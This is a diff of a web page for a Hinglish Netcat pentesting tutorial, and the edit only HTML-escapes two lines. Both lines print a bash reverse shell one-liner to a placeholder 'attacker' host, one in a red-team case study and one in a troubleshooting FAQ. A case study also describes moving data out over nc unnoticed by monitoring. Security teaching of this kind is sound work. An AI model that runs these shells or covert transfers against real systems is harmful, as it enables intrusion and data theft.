@@ -522,7 +522,7 @@ ssh -D 1080 user@jumphost
         Netcat real-world pentesting और incident response में daily use होता है। यहाँ practical scenarios हैं:
       </p>
       <p>
-        <strong className="text-white">Case Study 1 — Post-Exploitation Reverse Shell:</strong> एक red team engagement में tester ने web application पर RCE vulnerability exploit की। Bash reverse shell use करके target server पर access मिला: bash -i >& /dev/tcp/attacker/4444 0>&1। Python PTY upgrade करके stable interactive shell बनाया। इस shell से internal network scan किया — 3 और servers मिले जो firewall के पीछे थे। Netcat port forwarding से उन servers तक access मिला। कुल 4 compromised hosts — सब Netcat से।
+        <strong className="text-white">Case Study 1 — Post-Exploitation Reverse Shell:</strong> एक red team engagement में tester ने web application पर RCE vulnerability exploit की। Bash reverse shell use करके target server पर access मिला: bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1। Python PTY upgrade करके stable interactive shell बनाया। इस shell से internal network scan किया — 3 और servers मिले जो firewall के पीछे थे। Netcat port forwarding से उन servers तक access मिला। कुल 4 compromised hosts — सब Netcat से।
       </p>
       <p>
         <strong className="text-white">Case Study 2 — Forensic Data Exfiltration:</strong> Incident response team को compromised server से log files निकालनी थीं। Server पर FTP/SCP available नहीं था — सिर्फ Netcat था। Encrypted file transfer use किया: openssl enc + nc pipe। 500MB logs securely transfer हुए बिना network monitoring detect करे। Integrity verify करने के लिए sha256sum compare किया — सब match।
@@ -654,7 +654,7 @@ nc -lvnp 8080 | xxd | tee hex_dump.log
       <h2>Common Problems and Solutions</h2>
       <div className="space-y-3 mt-4">
         {[
-          { q: '-e flag काम नहीं कर रहा', a: 'कुछ Netcat versions (security reasons) में -e disable है। Bash reverse shell use करो: bash -i >& /dev/tcp/attacker/4444 0>&1। Ya Ncat install करो — उसमें -e हमेशा काम करता है। mkfifo method भी try करो — -e dependency हटाता है।' },
+          { q: '-e flag काम नहीं कर रहा', a: 'कुछ Netcat versions (security reasons) में -e disable है। Bash reverse shell use करो: bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1। Ya Ncat install करो — उसमें -e हमेशा काम करता है। mkfifo method भी try करो — -e dependency हटाता है।' },
           { q: 'Connection timeout हो रहा है', a: '-w flag से timeout बढ़ाओ: nc -w 10 target 80। Firewall block कर रहा होगा — अलग port try करो। Network connectivity check करो: ping target_ip। DNS resolution disable करो (-n flag) — faster होगा।' },
           { q: 'UDP scan reliable नहीं है', a: 'UDP connectionless protocol है — -z flag reliable नहीं। ICMP unreachable messages check करो। Nmap -sU better है UDP scanning के लिए। कुछ services UDP पर response नहीं देतीं।' },
           { q: 'File transfer बीच में रुक गया', a: 'Large files के लिए tar+nc method use करो। Network stability check करो। pv command से progress देखो: pv file | nc target 4444। -w timeout increase करो। Checksum verify करो transfer के बाद।' },
